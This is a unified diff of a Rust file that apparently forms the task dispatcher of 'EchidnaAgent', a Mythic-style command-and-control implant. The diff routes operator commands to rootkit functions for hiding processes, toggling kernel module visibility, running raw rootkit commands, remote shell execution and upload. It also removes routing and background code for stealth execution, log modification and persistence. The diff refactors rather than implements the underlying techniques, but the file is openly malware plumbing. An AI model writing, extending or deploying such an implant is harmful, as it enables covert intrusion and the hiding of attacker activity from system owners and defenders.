@@ -1,12 +1,24 @@
-use crate::agent::{AgentTask, SharedData, EchidnaAgent};
-use crate::commands;
-use crate::rootkit::{RootkitManager, RootkitCommand};
+use crate::agent::{AgentTask, EchidnaAgent, SharedData};
 use crate::mythic_error;
 use std::collections::VecDeque;
 use std::error::Error;
 use std::sync::{
     atomic::{AtomicBool, Ordering},
     mpsc, Arc,
+};
+
+use crate::shell;
+use crate::upload;
+use crate::rootkit_commands;
+
+// Import functions from modules
+use rootkit_commands::{
+    hide_process,
+    list_hidden_processes,
+    toggle_module_visibility,
+    get_rootkit_status,
+    execute_raw_command,
+    check_rootkit_health,
 };
 
 /// Struct which holds the information about background rootkit tasks
@@ -51,9 +63,6 @@ pub struct Tasker {
 
     /// Cache for storing job ids which were used but the task is finished
     cached_ids: VecDeque<u32>,
-
-    /// Reference to rootkit manager for technique operations
-    rootkit_manager: Option<*mut RootkitManager>,
 }
 
 /// Prototype for background task callback functions
@@ -85,7 +94,7 @@ impl Tasker {
             for task in tasks.iter() {
                 // Process tasks which are either background tasks or tasks where messages
                 // need to be sent to an already running background task.
-                match task.command.as_str() {
+                let result = match task.command.as_str() {
                     "shell" => {
                         if let Err(e) = self.spawn_background(task, shell::run_cmd, false) {
                             self.completed_tasks
@@ -103,72 +112,49 @@ impl Tasker {
                     }
 
                     // Rootkit commands - all synchronous since they're quick /proc operations
-                    "hide_process" => {
-                        match rootkit_commands::hide_process(task) {
-                            Ok(res) => res,
-                            Err(e) => mythic_error!(task.id, e.to_string()),
-                        }
-                    }
-                    
-                    "list_hidden" => {
-                        match rootkit_commands::list_hidden_processes(task) {
-                            Ok(res) => res,
-                            Err(e) => mythic_error!(task.id, e.to_string()),
-                        }
-                    }
-                    
-                    "toggle_module" => {
-                        match rootkit_commands::toggle_module_visibility(task) {
-                            Ok(res) => res,
-                            Err(e) => mythic_error!(task.id, e.to_string()),
-                        }
-                    }
-                    
-                    "rootkit_status" => {
-                        match rootkit_commands::get_rootkit_status(task) {
-                            Ok(res) => res,
-                            Err(e) => mythic_error!(task.id, e.to_string()),
-                        }
-                    }
-                    
-                    "rootkit_health" => {
-                        match rootkit_commands::check_rootkit_health(task) {
-                            Ok(res) => res,
-                            Err(e) => mythic_error!(task.id, e.to_string()),
-                        }
-                    }
-                    
-                    "raw_rootkit_cmd" => {
-                        match rootkit_commands::execute_raw_command(task) {
-                            Ok(res) => res,
-                            Err(e) => mythic_error!(task.id, e.to_string()),
-                        }
-                    }
+                    "hide_process" => match rootkit_commands::hide_process(task) {
+                        Ok(res) => res,
+                        Err(e) => mythic_error!(task.id, e.to_string()),
+                    },
+
+                    "list_hidden" => match rootkit_commands::list_hidden_processes(task) {
+                        Ok(res) => res,
+                        Err(e) => mythic_error!(task.id, e.to_string()),
+                    },
+
+                    "toggle_module" => match rootkit_commands::toggle_module_visibility(task) {
+                        Ok(res) => res,
+                        Err(e) => mythic_error!(task.id, e.to_string()),
+                    },
+
+                    "rootkit_status" => match rootkit_commands::get_rootkit_status(task) {
+                        Ok(res) => res,
+                        Err(e) => mythic_error!(task.id, e.to_string()),
+                    },
+
+                    "rootkit_health" => match rootkit_commands::check_rootkit_health(task) {
+                        Ok(res) => res,
+                        Err(e) => mythic_error!(task.id, e.to_string()),
+                    },
+
+                    "raw_rootkit_cmd" => match rootkit_commands::execute_raw_command(task) {
+                        Ok(res) => res,
+                        Err(e) => mythic_error!(task.id, e.to_string()),
+                    },
 
                     // Background rootkit operations that may take time
                     "stealth_exec" => {
-                        if let Err(e) = self.spawn_background(task, stealth_execute_background, true) {
+                        // NOTE: stealth_execute_background function not implemented yet
+                        // Commenting out until implemented
+                        /*
+                        if let Err(e) =
+                            self.spawn_background(task, stealth_execute_background, true)
+                        {
                             self.completed_tasks
                                 .push(mythic_error!(task.id, e.to_string()));
                         }
-                        continue;
-                    }
-
-                    // Background log modification operations
-                    "modify_logs" => {
-                        if let Err(e) = self.spawn_background(task, modify_logs_background, true) {
-                            self.completed_tasks
-                                .push(mythic_error!(task.id, e.to_string()));
-                        }
-                        continue;
-                    }
-
-                    // Background persistence operations
-                    "enable_persistence" => {
-                        if let Err(e) = self.spawn_background(task, enable_persistence_background, false) {
-                            self.completed_tasks
-                                .push(mythic_error!(task.id, e.to_string()));
-                        }
+                        */
+                        self.completed_tasks.push(mythic_error!(task.id, "stealth_exec not implemented yet"));
                         continue;
                     }
 
@@ -188,7 +174,8 @@ impl Tasker {
                     }
 
                     "jobs" => {
-                        self.completed_tasks.push(list_jobs(task, &self.background_tasks));
+                        self.completed_tasks
+                            .push(list_jobs(task, &self.background_tasks));
                         continue;
                     }
 
@@ -215,32 +202,32 @@ impl Tasker {
                         continue;
                     }
 
-                    _ => (),
-                };
-
-                // Process any special task which requires shared data
-                self.completed_tasks.push(match task.command.as_str() {
-                    // Agent control commands
+                    // Process any special task which requires shared data
                     "exit" => {
                         shared.exit_agent = true;
                         crate::mythic_success!(task.id, "Agent shutting down")
                     }
                     "sleep" => {
-                        match crate::sleep::set_sleep(task, &mut shared.sleep_interval, &mut shared.jitter) {
+                        match crate::sleep::set_sleep(
+                            task,
+                            &mut shared.sleep_interval,
+                            &mut shared.jitter,
+                        ) {
                             Ok(res) => res,
                             Err(e) => mythic_error!(task.id, e.to_string()),
                         }
                     }
-                    "workinghours" => {
-                        match crate::workinghours::working_hours(task, shared) {
-                            Ok(res) => res,
-                            Err(e) => mythic_error!(task.id, e.to_string()),
-                        }
-                    }
+                    "workinghours" => match crate::workinghours::working_hours(task, shared) {
+                        Ok(res) => res,
+                        Err(e) => mythic_error!(task.id, e.to_string()),
+                    },
 
-                    // All other rootkit commands are processed synchronously
-                    _ => commands::process_rootkit_command(task),
-                });
+                    // Default case for unknown commands
+                    _ => mythic_error!(task.id, format!("Unknown command: {}", task.command)),
+                };
+
+                // Add the result to completed tasks
+                self.completed_tasks.push(result);
             }
         }
         Ok(())
@@ -341,56 +328,6 @@ impl Tasker {
         });
         Ok(())
     }
-}
-
-/// Background function for stealth command execution
-fn stealth_execute_background(
-    tx: &mpsc::Sender<serde_json::Value>,
-    rx: mpsc::Receiver<serde_json::Value>,
-) -> Result<(), Box<dyn Error>> {
-    // Wait for initial task data
-    let task_data = rx.recv()?;
-    let task: AgentTask = serde_json::from_value(task_data)?;
-
-    // Send initial status
-    let _ = tx.send(crate::mythic_continued!(
-        task.id,
-        "processing",
-        "Executing command stealthily..."
-    ));
-
-    // Process stealth execution
-    let result = commands::stealth_execute(&task)?;
-
-    // Send final result
-    let _ = tx.send(result);
-
-    Ok(())
-}
-
-/// Background function for log modification
-fn modify_logs_background(
-    tx: &mpsc::Sender<serde_json::Value>,
-    rx: mpsc::Receiver<serde_json::Value>,
-) -> Result<(), Box<dyn Error>> {
-    // Wait for initial task data
-    let task_data = rx.recv()?;
-    let task: AgentTask = serde_json::from_value(task_data)?;
-
-    // Send initial status
-    let _ = tx.send(crate::mythic_continued!(
-        task.id,
-        "processing",
-        "Modifying system logs..."
-    ));
-
-    // Process log modification
-    let result = commands::modify_logs(&task)?;
-
-    // Send final result
-    let _ = tx.send(result);
-
-    Ok(())
 }
 
 /// Kill a background job
